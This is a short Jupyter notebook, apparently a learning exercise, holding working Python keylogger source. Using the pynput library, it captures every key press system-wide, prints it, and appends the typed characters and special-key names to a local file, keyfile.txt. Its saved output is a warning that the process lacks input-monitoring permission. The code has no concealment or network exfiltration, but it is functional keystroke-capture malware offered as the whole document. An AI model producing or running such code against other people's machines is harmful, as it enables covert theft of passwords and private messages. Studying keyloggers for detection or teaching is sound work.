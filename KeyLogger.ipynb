{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "2d319643",
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "This process is not trusted! Input event monitoring will not be possible until it is added to accessibility clients.\n"
     ]
    }
   ],
   "source": [
    "from pynput import keyboard\n",
    "\n",
    "def keyPressed(key):\n",
    "    print(str(key))\n",
    "    with open(\"keyfile.txt\", 'a') as logKey:\n",
    "        try:\n",
    "            if hasattr(key, 'char') and key.char is not None:\n",
    "                logKey.write(key.char)\n",
    "            else:\n",
    "                if key == keyboard.Key.space:\n",
    "                    logKey.write(' ')\n",
    "                elif key not in [keyboard.Key.space, keyboard.Key.enter, keyboard.Key.backspace, keyboard.Key.tab]:\n",
    "                    logKey.write(f'[{str(key)}]')\n",
    "        except Exception as e:\n",
    "            print(f\"Error: {e}\")\n",
    "\n",
    "if __name__ == \"__main__\":\n",
    "    listener = keyboard.Listener(on_press=keyPressed)\n",
    "    listener.start()\n",
    "    input(\"Press Enter to stop...\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "fcbed5ad",
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.11.5"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
